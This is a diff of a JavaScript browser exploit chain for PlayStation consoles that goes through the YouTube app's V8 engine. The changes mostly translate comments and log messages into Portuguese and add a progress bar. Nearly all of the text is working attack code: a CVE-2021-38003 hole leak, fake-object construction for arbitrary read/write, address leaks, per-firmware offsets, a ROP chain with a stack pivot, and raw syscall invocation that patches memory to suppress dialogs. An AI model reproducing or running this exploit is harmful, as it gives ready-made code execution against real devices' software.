@@ -30,7 +30,7 @@ function get_cobalt_buildnumber() {
 })();
 
 let NETWORK_LOGGING = false;
-// Use setlogserver.js payload to change server url at runtime
+// Use o payload setlogserver.js para alterar a URL do servidor em tempo de execução
 let LOG_SERVER = 'http://192.168.1.100:8080/log';
 
 let _log_socket_fd = null;
@@ -57,11 +57,20 @@ async function checkLogServer() {
 }
 
 let outputElement = null;
-// hack for scrolling messages
-let maxLines = 56;
-const fontSize = Math.floor(window.innerHeight / maxLines * 0.85);
-const leftPadding = Math.floor(window.innerWidth * 0.005);
-const topPadding = Math.floor(window.innerHeight * 0.005);
+// quantidade de linhas visíveis (rolagem das mensagens)
+let maxLines = 22;
+
+// Atualiza a borda azul: percent de 0 a 100.
+// A barra começa no topo central e desce pelos dois lados até a base central.
+window.updateProgress = function(percent) {
+    const p = Math.max(0, Math.min(100, percent)) / 100;
+    ['arc-right', 'arc-left'].forEach(function(id) {
+        const path = document.getElementById(id);
+        if (!path) return;
+        const len = path.getTotalLength();
+        path.setAttribute('stroke-dasharray', (len * p) + ' ' + len);
+    });
+};
 
 async function log(msg) {
     let message = String(msg);
@@ -72,15 +81,12 @@ async function log(msg) {
             outputElement.id = 'output';
             document.body.appendChild(outputElement);
         }
-        outputElement.style.paddingLeft = leftPadding + 'px';
-        outputElement.style.paddingTop = topPadding + 'px'; 
     }
     
     const lines = message.split('\n');
     lines.forEach(line => {
         let lineDiv = document.createElement('div');
         lineDiv.textContent = line === '' ? '\u00A0' : line;
-        lineDiv.style.fontSize = fontSize + 'px';
         
         outputElement.appendChild(lineDiv);
     });
@@ -150,8 +156,9 @@ function trigger() {
 
 (async function() {
     try {
-        await log(version_string);
-        await log('Starting Exploit');
+        await log("Desbloqueando o console");
+        await log('Iniciando exploit');
+        updateProgress(5);
         
         await gc();
         await gc();
@@ -159,7 +166,7 @@ function trigger() {
         await gc();
         
         // CVE-2021-38003
-        // CVE-2022-4174 faster hole leak
+        // CVE-2022-4174: vazamento de hole mais rápido
         // https://starlabs.sg/blog/2022/12-the-hole-new-world-how-a-small-leak-will-sink-a-great-browser-cve-2021-38003/
         let hole = trigger();
         
@@ -180,11 +187,11 @@ function trigger() {
         gc();
         map1.set(0x0, 0x1);
         
-        //oob_arr[31] : 0x2 -- victim_arr length
-        //oob_arr[32] : 0xf -- victim_arr ExternalPointer_t 
-        //oob_arr[33] : 0x27e8412d1 -- victm_arr base_pointer
+        //oob_arr[31] : 0x2 -- tamanho de victim_arr
+        //oob_arr[32] : 0xf -- ExternalPointer_t de victim_arr 
+        //oob_arr[33] : 0x27e8412d1 -- base_pointer de victim_arr
         
-        await log ("oob_arr length : " + toHex(oob_arr.length));
+        await log ("tamanho de oob_arr : " + toHex(oob_arr.length));
         
         const oob_arr_before = [];
         for (let i = 0; i < 100; i++) {
@@ -204,10 +211,10 @@ function trigger() {
         //await log('obj_arr_offset : ' + obj_arr_offset);
         
         if (obj_arr_offset === -1) {
-            throw new Error("Failed to get unstable primitive");
+            throw new Error("Falha ao obter a primitiva instável");
         }
         
-        await log("Unstable primitive achieved");
+        await log("Primitiva instável obtida");
         
         function addrof_unstable(obj) {
             const obj_arr_org_value = oob_arr[obj_arr_offset];
@@ -240,29 +247,29 @@ function trigger() {
             return fake_obj;
         }                
         
-        // Allocate Large Object Space with proper page metadata
-        // Create object array first to initialize page structures
+        // Aloca o Large Object Space com metadados de página adequados
+        // Cria primeiro o array de objetos para inicializar as estruturas de página
         const stable_array = new Array(0x10000);
         for (let i = 0; i < stable_array.length; i++) {
             stable_array[i] = {};
         }
                         
-        // Get FixedDoubleArray map from a template
+        // Obtém o map de FixedDoubleArray a partir de um template
         const double_template = new Array(0x10);
         double_template.fill(3.14);
         const double_template_addr = addrof_unstable(double_template);
         const double_elements_addr = read64_unstable(double_template_addr + 0x10n) - 1n;
         const fixed_double_array_map = read64_unstable(double_elements_addr + 0x00n);
         
-        // Get stable_array addresses
+        // Obtém os endereços de stable_array
         const stable_array_addr = addrof_unstable(stable_array);
         const stable_elements_addr = read64_unstable(stable_array_addr + 0x10n) - 1n;
         
-        // Transform elements to FixedDoubleArray
-        // This makes GC happy later
+        // Transforma os elements em FixedDoubleArray
+        // Isso deixa o GC satisfeito depois
         write64_unstable(stable_elements_addr + 0x00n, fixed_double_array_map);
         
-        // Get templates for large external storage arrays
+        // Obtém templates para arrays de armazenamento externo grandes
         const template_biguint = new BigUint64Array(64);
         const template_biguint_addr = addrof_unstable(template_biguint);
         const template_biguint_elements = read64_unstable(template_biguint_addr + 0x10n) - 1n;
@@ -272,7 +279,7 @@ function trigger() {
         const biguint_elem_map = read64_unstable(template_biguint_elements + 0x00n);
         const biguint_elem_len = read64_unstable(template_biguint_elements + 0x08n);
         
-        // Get template for small inline storage arrays
+        // Obtém template para arrays de armazenamento inline pequenos
         const template_small = new BigUint64Array(8);
         const template_small_addr = addrof_unstable(template_small);
         const template_small_buffer_addr = read64_unstable(template_small_addr + 0x18n) - 1n;
@@ -288,7 +295,7 @@ function trigger() {
         const small_buffer_elements = read64_unstable(template_small_buffer_addr + 0x10n);
         const small_buffer_bit_field = read64_unstable(template_small_buffer_addr + 0x30n);
         
-        // Get template for ArrayBuffer
+        // Obtém template para ArrayBuffer
         const template_buffer = new ArrayBuffer(1024);
         const template_buffer_addr = addrof_unstable(template_buffer);
         const template_buffer_elements = read64_unstable(template_buffer_addr + 0x10n) - 1n;
@@ -298,7 +305,7 @@ function trigger() {
         const buffer_elem_map = read64_unstable(template_buffer_elements + 0x00n);
         const buffer_elem_len = read64_unstable(template_buffer_elements + 0x08n);
         
-        // Get template for Array object
+        // Obtém template para objeto Array
         const template_array = [{}, {}];
         const template_array_addr = addrof_unstable(template_array);
         const template_array_elements_addr = read64_unstable(template_array_addr + 0x10n) - 1n;
@@ -307,28 +314,28 @@ function trigger() {
         const array_props = read64_unstable(template_array_addr + 0x08n);
         const array_elem_map = read64_unstable(template_array_elements_addr + 0x00n);
         
-        // Get template for double object
+        // Obtém template para objeto double
         const heap_number = 1.1;
         const heap_number_addr = addrof_unstable(heap_number);
         const heap_number_map = read64_unstable(heap_number_addr);
         
         const base = stable_elements_addr + 0x2000n;
         
-        // Main data region that fake_rw will read/write
+        // Região de dados principal que o fake_rw vai ler/escrever
         const fake_rw_data = base + 0x0000n;
         
-        // Inside fake_rw_data: fake Array's elements (at the beginning)
+        // Dentro de fake_rw_data: elements do Array falso (no início)
         const fake_array_elements_data = fake_rw_data + 0x0000n;
-        // Structure: +0x00: map, +0x08: length, +0x10: slot[0], +0x18: slot[1], ...
+        // Estrutura: +0x00: map, +0x08: length, +0x10: slot[0], +0x18: slot[1], ...
         
         const fake_arr2_obj = base + 0x0100n;
         const fake_arr2_elements = base + 0x0150n;
         const fake_rw2_data = base + 0x0200n;
         
         // +0x00: ArrayBuffer (0x38 bytes)
-        // +0x48: Elements FixedArray (0x10 bytes header)
-        // +0x58: Data (64 bytes for 8 uint64s)
-        // +0x98: BigUint64Array object (0x48 bytes)
+        // +0x48: elements FixedArray (cabeçalho de 0x10 bytes)
+        // +0x58: dados (64 bytes para 8 uint64s)
+        // +0x98: objeto BigUint64Array (0x48 bytes)
         
         const fake_bc_base = base + 0x0400n;
         const fake_bc_buffer = fake_bc_base + 0x00n;
@@ -345,46 +352,46 @@ function trigger() {
         const fake_buffer_rw2_obj = base + 0x0800n;
         const fake_buffer_rw2_elements = base + 0x0850n;
         
-        // Objects outside fake_rw accessible range
+        // Objetos fora do intervalo acessível pelo fake_rw
         const fake_buffer_rw_obj = base + 0x1000n;
         const fake_buffer_rw_elements = base + 0x1050n;
         const fake_array_obj = base + 0x1100n;
         const fake_rw_obj = base + 0x1200n;
         const fake_rw_elements = base + 0x1250n;
         
-        // ROP chain with external storage
+        // ROP chain com armazenamento externo
         const fake_rop_chain_data = base + 0x2000n;
         const fake_rop_chain_buffer_obj = base + 0x3000n;
         const fake_rop_chain_buffer_elements = base + 0x3050n;
         const fake_rop_chain_obj = base + 0x3100n;
         const fake_rop_chain_elements = base + 0x3150n;
         
-        // return_value_buf with inline storage
+        // return_value_buf com armazenamento inline
         const fake_return_value_elements = base + 0x4000n;
         const fake_return_value_buffer_obj = base + 0x4100n;
         const fake_return_value_buffer_elements = base + 0x4150n;
         const fake_return_value_obj = base + 0x4200n;
         
-        // Create fake Array elements inside fake_rw_data region
-        // FixedArray: map + length + data slots
+        // Cria os elements do Array falso dentro da região fake_rw_data
+        // FixedArray: map + length + slots de dados
         write64_unstable(fake_array_elements_data + 0x00n, array_elem_map);
-        write64_unstable(fake_array_elements_data + 0x08n, 0x0000001000000000n);  // length = 16 slots (Smi)
+        write64_unstable(fake_array_elements_data + 0x08n, 0x0000001000000000n);  // tamanho = 16 slots (Smi)
         
         for (let i = 0n; i < 16n; i++) {
             write64_unstable(fake_array_elements_data + 0x10n + i * 8n, 0n);
         }
         
-        // Create fake Array object pointing to elements inside fake_rw_data
+        // Cria o objeto Array falso apontando para os elements dentro de fake_rw_data
         write64_unstable(fake_array_obj + 0x00n, array_map);
         write64_unstable(fake_array_obj + 0x08n, array_props);
-        write64_unstable(fake_array_obj + 0x10n, fake_array_elements_data + 1n);  // elements (tagged)
-        write64_unstable(fake_array_obj + 0x18n, 0x0000001000000000n);  // length = 16 (Smi)
+        write64_unstable(fake_array_obj + 0x10n, fake_array_elements_data + 1n);  // elements (marcado)
+        write64_unstable(fake_array_obj + 0x18n, 0x0000001000000000n);  // tamanho = 16 (Smi)
         
-        // Create fake ArrayBuffer #1 elements
+        // Cria os elements do ArrayBuffer falso #1
         write64_unstable(fake_buffer_rw_elements + 0x00n, buffer_elem_map);
         write64_unstable(fake_buffer_rw_elements + 0x08n, buffer_elem_len);
         
-        // Create fake ArrayBuffer #1 (buffer_rw)
+        // Cria o ArrayBuffer falso #1 (buffer_rw)
         write64_unstable(fake_buffer_rw_obj + 0x00n, buffer_map);
         write64_unstable(fake_buffer_rw_obj + 0x08n, buffer_props);
         write64_unstable(fake_buffer_rw_obj + 0x10n, fake_buffer_rw_elements + 1n);
@@ -393,11 +400,11 @@ function trigger() {
         write64_unstable(fake_buffer_rw_obj + 0x28n, 0n);  // extension
         write64_unstable(fake_buffer_rw_obj + 0x30n, 0n);  // bit_field
         
-        // Create fake ArrayBuffer #2 elements
+        // Cria os elements do ArrayBuffer falso #2
         write64_unstable(fake_buffer_rw2_elements + 0x00n, buffer_elem_map);
         write64_unstable(fake_buffer_rw2_elements + 0x08n, buffer_elem_len);
         
-        // Create fake ArrayBuffer #2 (buffer_rw2)
+        // Cria o ArrayBuffer falso #2 (buffer_rw2)
         write64_unstable(fake_buffer_rw2_obj + 0x00n, buffer_map);
         write64_unstable(fake_buffer_rw2_obj + 0x08n, buffer_props);
         write64_unstable(fake_buffer_rw2_obj + 0x10n, fake_buffer_rw2_elements + 1n);
@@ -406,11 +413,11 @@ function trigger() {
         write64_unstable(fake_buffer_rw2_obj + 0x28n, 0n);  // extension
         write64_unstable(fake_buffer_rw2_obj + 0x30n, 0n);  // bit_field
         
-        // Create fake BigUint64Array #2 elements
+        // Cria os elements do BigUint64Array falso #2
         write64_unstable(fake_arr2_elements + 0x00n, biguint_elem_map);
         write64_unstable(fake_arr2_elements + 0x08n, biguint_elem_len);
         
-        // Create fake BigUint64Array #2 (fake_arr2)
+        // Cria o BigUint64Array falso #2 (fake_arr2)
         write64_unstable(fake_arr2_obj + 0x00n, biguint_map);
         write64_unstable(fake_arr2_obj + 0x08n, biguint_props);
         write64_unstable(fake_arr2_obj + 0x10n, fake_arr2_elements + 1n);
@@ -421,18 +428,18 @@ function trigger() {
         write64_unstable(fake_arr2_obj + 0x38n, fake_rw2_data);  // external_pointer
         write64_unstable(fake_arr2_obj + 0x40n, 0n);  // base_pointer
         
-        // Create fake BigUint64Array #1 elements
+        // Cria os elements do BigUint64Array falso #1
         write64_unstable(fake_rw_elements + 0x00n, biguint_elem_map);
         write64_unstable(fake_rw_elements + 0x08n, biguint_elem_len);
         
-        // Create fake BigUint64Array #1 (fake_rw) - overlaps with fake_rw_data
+        // Cria o BigUint64Array falso #1 (fake_rw) - sobrepõe fake_rw_data
         write64_unstable(fake_rw_obj + 0x00n, biguint_map);
         write64_unstable(fake_rw_obj + 0x08n, biguint_props);
         write64_unstable(fake_rw_obj + 0x10n, fake_rw_elements + 1n);
         write64_unstable(fake_rw_obj + 0x18n, fake_buffer_rw_obj + 1n);
         write64_unstable(fake_rw_obj + 0x20n, 0n);  // byte_offset
         write64_unstable(fake_rw_obj + 0x28n, 0x1000n);  // byte_length
-        write64_unstable(fake_rw_obj + 0x30n, 0x200n);  // length (increased to 512)
+        write64_unstable(fake_rw_obj + 0x30n, 0x200n);  // length (aumentado para 512)
         write64_unstable(fake_rw_obj + 0x38n, fake_rw_data);  // external_pointer
         write64_unstable(fake_rw_obj + 0x40n, 0n);  // base_pointer
         
@@ -445,7 +452,7 @@ function trigger() {
         write64_unstable(fake_bc_buffer + 0x28n, 0n);     // extension
         write64_unstable(fake_bc_buffer + 0x30n, small_buffer_bit_field);
         
-        // Padding (0x38 - 0x47) - 16 bytes of zeros
+        // Preenchimento (0x38 - 0x47) - 16 bytes zerados
         write64_unstable(fake_bc_buffer + 0x38n, 0n);
         write64_unstable(fake_bc_buffer + 0x40n, 0n);
         
@@ -453,16 +460,16 @@ function trigger() {
         write64_unstable(fake_bc_elements + 0x00n, small_elem_map);
         write64_unstable(fake_bc_elements + 0x08n, small_elem_length_field);
         
-        // BigUint64Array object (0x98 - 0xDF)
+        // objeto BigUint64Array (0x98 - 0xDF)
         write64_unstable(fake_bc_obj + 0x00n, small_map);
         write64_unstable(fake_bc_obj + 0x08n, small_props);
-        write64_unstable(fake_bc_obj + 0x10n, fake_bc_elements + 1n);  // elements (tagged)
-        write64_unstable(fake_bc_obj + 0x18n, fake_bc_buffer + 1n);    // buffer (tagged)
+        write64_unstable(fake_bc_obj + 0x10n, fake_bc_elements + 1n);  // elements (marcado)
+        write64_unstable(fake_bc_obj + 0x18n, fake_bc_buffer + 1n);    // buffer (marcado)
         write64_unstable(fake_bc_obj + 0x20n, 0n);     // byte_offset
         write64_unstable(fake_bc_obj + 0x28n, 0x40n);  // byte_length = 64
         write64_unstable(fake_bc_obj + 0x30n, 0x8n);   // length = 8
         write64_unstable(fake_bc_obj + 0x38n, 0xfn);   // external_ptr = 15
-        write64_unstable(fake_bc_obj + 0x40n, fake_bc_elements + 1n);  // base_pointer (tagged)
+        write64_unstable(fake_bc_obj + 0x40n, fake_bc_elements + 1n);  // base_pointer (marcado)
         
         write64_unstable(fake_frame_buffer + 0x00n, small_buffer_map);
         write64_unstable(fake_frame_buffer + 0x08n, small_buffer_props);
@@ -472,17 +479,17 @@ function trigger() {
         write64_unstable(fake_frame_buffer + 0x28n, 0n);
         write64_unstable(fake_frame_buffer + 0x30n, small_buffer_bit_field);
         
-        write64_unstable(fake_frame_buffer + 0x38n, 0n);  // Padding ?
-        write64_unstable(fake_frame_buffer + 0x40n, 0n);  // Padding
+        write64_unstable(fake_frame_buffer + 0x38n, 0n);  // Preenchimento ?
+        write64_unstable(fake_frame_buffer + 0x40n, 0n);  // Preenchimento
         
         write64_unstable(fake_frame_elements + 0x00n, small_elem_map);
         write64_unstable(fake_frame_elements + 0x08n, small_elem_length_field);
         
-        // This looks like BigUint64Array but it is NOT!!!!
-        // Using BigUint64Array for fake frame makes GC angry
-        // Instead use double object
-        // But I will leave BigUint64Array struct except map
-        // So I can keep use the existing ROP code
+        // Isto parece um BigUint64Array, mas NÃO É!!!!
+        // Usar BigUint64Array para o frame falso deixa o GC irritado
+        // Em vez disso, usa um objeto double
+        // Mas mantenho a estrutura do BigUint64Array, exceto o map
+        // Assim posso continuar usando o código ROP existente
         write64_unstable(fake_frame_obj + 0x00n, heap_number_map);
         write64_unstable(fake_frame_obj + 0x08n, small_props);
         write64_unstable(fake_frame_obj + 0x10n, fake_frame_elements + 1n);
@@ -498,15 +505,15 @@ function trigger() {
             write64_unstable(fake_frame_data + i, 0n);
         }
         
-        // Create fake rop_chain elements
+        // Cria os elements do rop_chain falso
         write64_unstable(fake_rop_chain_elements + 0x00n, biguint_elem_map);
         write64_unstable(fake_rop_chain_elements + 0x08n, biguint_elem_len);
         
-        // Create fake rop_chain ArrayBuffer elements
+        // Cria os elements do ArrayBuffer do rop_chain falso
         write64_unstable(fake_rop_chain_buffer_elements + 0x00n, buffer_elem_map);
         write64_unstable(fake_rop_chain_buffer_elements + 0x08n, buffer_elem_len);
         
-        // Create fake rop_chain ArrayBuffer
+        // Cria o ArrayBuffer do rop_chain falso
         write64_unstable(fake_rop_chain_buffer_obj + 0x00n, buffer_map);
         write64_unstable(fake_rop_chain_buffer_obj + 0x08n, buffer_props);
         write64_unstable(fake_rop_chain_buffer_obj + 0x10n, fake_rop_chain_buffer_elements + 1n);
@@ -515,7 +522,7 @@ function trigger() {
         write64_unstable(fake_rop_chain_buffer_obj + 0x28n, 0n);  // extension
         write64_unstable(fake_rop_chain_buffer_obj + 0x30n, 0n);  // bit_field
         
-        // Create fake rop_chain BigUint64Array (external storage)
+        // Cria o BigUint64Array do rop_chain falso (armazenamento externo)
         write64_unstable(fake_rop_chain_obj + 0x00n, biguint_map);
         write64_unstable(fake_rop_chain_obj + 0x08n, biguint_props);
         write64_unstable(fake_rop_chain_obj + 0x10n, fake_rop_chain_elements + 1n);
@@ -526,15 +533,15 @@ function trigger() {
         write64_unstable(fake_rop_chain_obj + 0x38n, fake_rop_chain_data);  // external_pointer
         write64_unstable(fake_rop_chain_obj + 0x40n, 0n);  // base_pointer
         
-        // Create fake return_value_buf elements (inline storage)
+        // Cria os elements do return_value_buf falso (armazenamento inline)
         write64_unstable(fake_return_value_elements + 0x00n, small_elem_map);
         write64_unstable(fake_return_value_elements + 0x08n, small_elem_length_field);
         
-        // Create fake return_value_buf ArrayBuffer elements
+        // Cria os elements do ArrayBuffer do return_value_buf falso
         write64_unstable(fake_return_value_buffer_elements + 0x00n, buffer_elem_map);
         write64_unstable(fake_return_value_buffer_elements + 0x08n, buffer_elem_len);
         
-        // Create fake return_value_buf ArrayBuffer
+        // Cria o ArrayBuffer do return_value_buf falso
         write64_unstable(fake_return_value_buffer_obj + 0x00n, small_buffer_map);
         write64_unstable(fake_return_value_buffer_obj + 0x08n, small_buffer_props);
         write64_unstable(fake_return_value_buffer_obj + 0x10n, small_buffer_elements);
@@ -543,7 +550,7 @@ function trigger() {
         write64_unstable(fake_return_value_buffer_obj + 0x28n, 0n);  // extension
         write64_unstable(fake_return_value_buffer_obj + 0x30n, small_buffer_bit_field);
         
-        // Create fake return_value_buf BigUint64Array (inline storage)
+        // Cria o BigUint64Array do return_value_buf falso (armazenamento inline)
         write64_unstable(fake_return_value_obj + 0x00n, small_map);
         write64_unstable(fake_return_value_obj + 0x08n, small_props);
         write64_unstable(fake_return_value_obj + 0x10n, fake_return_value_elements + 1n);
@@ -554,16 +561,16 @@ function trigger() {
         write64_unstable(fake_return_value_obj + 0x38n, 0xfn);  // external_pointer
         write64_unstable(fake_return_value_obj + 0x40n, fake_return_value_elements + 1n);  // base_pointer
         
-        // Materialize fake objects
+        // Materializa os objetos falsos
         const fake_rw = create_fakeobj_unstable(fake_rw_obj);
         const fake_arr2 = create_fakeobj_unstable(fake_arr2_obj);
         const fake_array = create_fakeobj_unstable(fake_array_obj);
         
-        // Calculate offsets for accessing via fake_rw
+        // Calcula os offsets para acessar via fake_rw
         const arr2_external_offset = Number((fake_arr2_obj + 0x38n - fake_rw_data) / 8n);
         const fake_array_slot0_offset = Number((fake_array_elements_data + 0x10n - fake_rw_data) / 8n);
         
-        // Stable primitives
+        // Primitivas estáveis
         addrof = function(obj) {
             const arr_elements_org = fake_rw[fake_array_slot0_offset];
             fake_array[0] = obj;
@@ -652,15 +659,15 @@ function trigger() {
             return backing_store;
         }
         
-        await log("Stable primitive achieved");
+        await log("Primitiva estável obtida");
         
-        await log("Setting up ROP...");
+        await log("Configurando o ROP...");
         
         // https://github.com/google/google-ctf/tree/main/2023/quals/sandbox-v8box/solution
-        // We don't have pointer compression
+        // Não temos pointer compression
         
-        // Make bytecode larger and just use it's address
-        // No separate fake bytecode buffer
+        // Torna o bytecode maior e usa apenas o seu endereço
+        // Sem buffer de bytecode falso separado
         pwn = function(x) {
             let dummy1 = x + 1;
             let dummy2 = x + 2;
@@ -670,7 +677,7 @@ function trigger() {
             return x;
         }
         
-        pwn(1); // Generate bytecode
+        pwn(1); // Gera o bytecode
         
         get_bytecode_addr = function() {
             const pwn_addr = addrof(pwn); // JSFunction
@@ -694,16 +701,16 @@ function trigger() {
         write64(bc_start, 0xAB0025n);
         
         const stack_addr = addrof(pwn(1)) + 0x1n;
-        await log("Stack leak @ " + toHex(stack_addr));
+        await log("Vazamento da pilha @ " + toHex(stack_addr));
         
         const text_leak = read64(stack_addr + 0x8n);
-        await log("Text leak @ " + toHex(text_leak));
+        await log("Vazamento do text @ " + toHex(text_leak));
         
         const cbn = get_cobalt_buildnumber();
         
         if (cbn === "305777") {
             Y2_VERSION = "01.000.003 (min fw 4.03)";
-            await log("Youtube " + Y2_VERSION + " detected");
+            await log("Youtube " + Y2_VERSION + " detectado");
             Y2_OFFSET = Y2_OFFSET_403;
             ROP = ROP_403;
             
@@ -715,7 +722,7 @@ function trigger() {
             
         } else if (cbn === "18441022") {
             Y2_VERSION = "01.000.030 (min fw 12.20)";
-            await log("Youtube " + Y2_VERSION + " detected");
+            await log("Youtube " + Y2_VERSION + " detectado");
             Y2_OFFSET = Y2_OFFSET_1220;
             ROP = ROP_1220;
 
@@ -730,7 +737,7 @@ function trigger() {
             
         } else if (cbn === "05730512") {
             Y2_VERSION = "01.009.202 (min fw 13.20)";
-            await log("Youtube " + Y2_VERSION + " detected");
+            await log("Youtube " + Y2_VERSION + " detectado");
             Y2_OFFSET = Y2_OFFSET_1320;
             ROP = ROP_1320;
 
@@ -745,7 +752,7 @@ function trigger() {
             
         } else if (cbn === "06170617") {
             Y2_VERSION = "01.009.253 (min fw 13.40)";
-            await log("Youtube " + Y2_VERSION + " detected");
+            await log("Youtube " + Y2_VERSION + " detectado");
             Y2_OFFSET = Y2_OFFSET_1340;
             ROP = ROP_1340;
 
@@ -758,27 +765,28 @@ function trigger() {
             libc_base = read64(libstarboard_base + Y2_OFFSET.LIBC_LEAK1) - Y2_OFFSET.LIBC_LEAK2;
             await log("libc_base @ " + toHex(libc_base));
         } else {
-            throw new Error("UNSUPPORTED YOUTUBE VERSION");
+            throw new Error("VERSÃO DO YOUTUBE NÃO SUPORTADA");
         }
         
+        updateProgress(15);
         const rop_chain_addr = get_backing_store(rop_chain);
         await log("ROP chain @ " + toHex(rop_chain_addr));
         
-        // Fake bytecode for r14 register
-        fake_bc[0] = 0xABn; // Return opcode - keeps interpreter happy
+        // Bytecode falso para o registrador r14
+        fake_bc[0] = 0xABn; // Opcode de retorno - mantém o interpretador satisfeito
         const fake_bc_addr = get_backing_store(fake_bc);
         //await log("Fake bytecode @ " + toHex(fake_bc_addr));
         
         const fake_frame_backing = get_backing_store(fake_frame);
         
-        // This sets the r14 register which V8 expects to point to bytecode
+        // Isto define o registrador r14, que o V8 espera apontar para o bytecode
         write64(fake_frame_backing + 0x21n, fake_bc_addr);
         
         return_value_addr = get_backing_store(return_value_buf);
         //await log("return_value_addr @ " + toHex(return_value_addr));
 
         const fake_frame_addr = addrof(fake_frame);
-        // Pivot RSP
+        // Pivota o RSP
         write64(fake_frame_addr + 0x9n, ROP.pop_rsp); // pop rsp ; ret
         write64(fake_frame_addr + 0x9n + Y2_OFFSET.RSP_OFFSET, rop_chain_addr);
         
@@ -787,11 +795,11 @@ function trigger() {
         call_rop = function(address, rax = 0x0n, arg1 = 0x0n, arg2 = 0x0n, arg3 = 0x0n, arg4 = 0x0n, arg5 = 0x0n, arg6 = 0x0n) {
             let rop_i = 0;
             
-            // Syscall number
+            // Número da syscall
             rop_chain[rop_i++] = ROP.pop_rax; // pop rax ; ret
             rop_chain[rop_i++] = rax;
             
-            // Setup arguments
+            // Configura os argumentos
             rop_chain[rop_i++] = ROP.pop_rdi; // pop rdi ; ret
             rop_chain[rop_i++] = arg1;
             rop_chain[rop_i++] = ROP.pop_rsi; // pop rsi ; ret
@@ -805,15 +813,15 @@ function trigger() {
             rop_chain[rop_i++] = ROP.pop_r9; // pop r9 ; ret
             rop_chain[rop_i++] = arg6;
 
-            // Call function
+            // Chama a função
             rop_chain[rop_i++] = address; 
             
-            // Store return value to return_value_addr
+            // Armazena o valor de retorno em return_value_addr
             rop_chain[rop_i++] = ROP.pop_rdi; // pop rdi ; ret
             rop_chain[rop_i++] = return_value_addr;
             rop_chain[rop_i++] = ROP.mov_qword_rdi_rax; // mov qword [rdi], rax ; ret
             
-            // Return safe tagged value to JavaScript
+            // Retorna um valor marcado seguro para o JavaScript
             rop_chain[rop_i++] = ROP.mov_rax_0x200000000; // mov rax, 0x200000000 ; ret
 
             rop_chain[rop_i++] = ROP.pop_rbp; // pop rbp ; ret ;
@@ -825,8 +833,8 @@ function trigger() {
         }
         
         call = function(address, arg1 = 0x0n, arg2 = 0x0n, arg3 = 0x0n, arg4 = 0x0n, arg5 = 0x0n, arg6 = 0x0n) {                    
-            // GC friendly
-            // Get new bytecode_addr each time
+            // Amigável ao GC
+            // Obtém um novo bytecode_addr a cada vez
             const bc_start = get_bytecode_addr() + 0x36n;
             
             write64(bc_start, 0xAB0025n);
@@ -840,17 +848,18 @@ function trigger() {
             return return_value_buf[0];
         }
         
-        await log("ROP test, should see 0x0000000200000000");
+        await log("Teste do ROP, deve aparecer 0x0000000200000000");
         
         rop_test = call(ROP.mov_rax_0x200000000);
         await log(toHex(rop_test));
         
         if (rop_test !== 0x200000000n) {
-            await log("ERROR: ROP test failed");
-            throw new Error("ROP test failed");
+            await log("ERRO: teste do ROP falhou");
+            throw new Error("teste do ROP falhou");
         }
 
         // https://github.com/shahrilnet/remote_lua_loader/blob/22a03e38b6e8f13e2e379f7c5036767c14162ff3/savedata/syscall.lua#L42
+        updateProgress(30);
         const sceKernelGetModuleInfoFromAddr_addr = read64(Y2_OFFSET.sceKernelGetModuleInfoFromAddr);
         
         //gettimeofday plt
@@ -867,8 +876,8 @@ function trigger() {
         //await log("sceKernelGetModuleInfoFromAddr returned: " + toHex(ret));
 
         if (ret !== 0x0n) {
-            await log("ERROR: sceKernelGetModuleInfoFromAddr failed: " + toHex(ret));
-            throw new Error("sceKernelGetModuleInfoFromAddr failed");
+            await log("ERRO: sceKernelGetModuleInfoFromAddr falhou: " + toHex(ret));
+            throw new Error("sceKernelGetModuleInfoFromAddr falhou");
         }
         
         libkernel_base = read64(mod_info + SEGMENTS_OFFSET);
@@ -879,10 +888,10 @@ function trigger() {
         
         syscall = function(syscall_num, arg1 = 0x0n, arg2 = 0x0n, arg3 = 0x0n, arg4 = 0x0n, arg5 = 0x0n, arg6 = 0x0n) {
             if(syscall_num === undefined) {
-                throw new Error("ERROR: syscall not defined");
+                throw new Error("ERRO: syscall não definida");
             }
-            // GC friendly
-            // Get new bytecode_addr each time
+            // Amigável ao GC
+            // Obtém um novo bytecode_addr a cada vez
             const bc_start = get_bytecode_addr() + 0x36n;
             
             write64(bc_start, 0xAB0025n);
@@ -902,10 +911,10 @@ function trigger() {
         
         await load_localscript('misc.js');
         await checkLogServer();
+        updateProgress(40);
 
         if (Y2_OFFSET === Y2_OFFSET_403) {
-            // Thanks ufm42 for better implementation
-            await log("Disabling PSN dialog and YouTube splash...");
+            await log("Desabilitando o diálogo da PSN e a splash do YouTube...");
     
             const window_addr = addrof(window);
             //await log("window_addr: " + toHex(window_addr));
@@ -928,6 +937,7 @@ function trigger() {
             const browser_module_addr = read64(maybe_freeze_callback_addr + 0x30n);
             //await log("browser_module_addr: " + toHex(browser_module_addr));
             
+            
             const main_web_module_addr = read64(browser_module_addr + 0x678n);
             //await log("main_web_module_addr: " + toHex(main_web_module_addr));
             
@@ -946,31 +956,31 @@ function trigger() {
             const splash_screen_web_module_impl_addr = read64(splash_screen_web_module_addr + 0x18n);
             //await log("splash_screen_web_module_impl_addr: " + toHex(splash_screen_web_module_impl_addr));
     
-            await log("Disabling YouTube splash screen...");
+            await log("Desabilitando a splash screen do YouTube...");
             const main_web_module_generation_addr = browser_module_addr + 0xB08n;
             write32(main_web_module_generation_addr, 0xFFFFFFFFn);
-            await log("YT splash disabled!");
+            await log("Splash do YT desabilitada!");
     
-            await log("Disabling PSN popup...");
+            await log("Desabilitando o popup da PSN...");
             
             call(read64(Y2_OFFSET.sceMsgDialogTerminate));
                     
-            // Disable "no internet connection" retry timer
+            // Desabilita o timer de nova tentativa de "sem conexão com a internet"
             const on_error_retry_timer_addr = browser_module_addr + 0x960n;
             //await log("on_error_retry_timer_addr: " + toHex(on_error_retry_timer_addr));
             
             const is_running_addr = on_error_retry_timer_addr + 0x60n;
             //await log("is_running_addr: " + toHex(is_running_addr));
             
-            // Set is_running to 1 (true)
+            // Define is_running como 1 (verdadeiro)
             write8(is_running_addr, 0x1n);
             
-            await log("PSN popup disabled!");
+            await log("Popup da PSN desabilitado!");
             
         } else {
             
-            // This is voodoo hack
-            await log("Disabling PSN and no internet popup...");
+            // Esta é uma gambiarra
+            await log("Desabilitando o popup da PSN e de falta de internet...");
             
             const sceMsgDialogTerminate   = read64(Y2_OFFSET.sceMsgDialogTerminate);
             const sceErrorDialogTerminate = read64(Y2_OFFSET.sceErrorDialogTerminate);
@@ -984,33 +994,35 @@ function trigger() {
                 syscall(SYSCALL.nanosleep, timespec);
             }
             
-            await log("Popup disabled!");
+            await log("Popup desabilitado!");
         }
         
         
         FW_VERSION = get_fwversion();
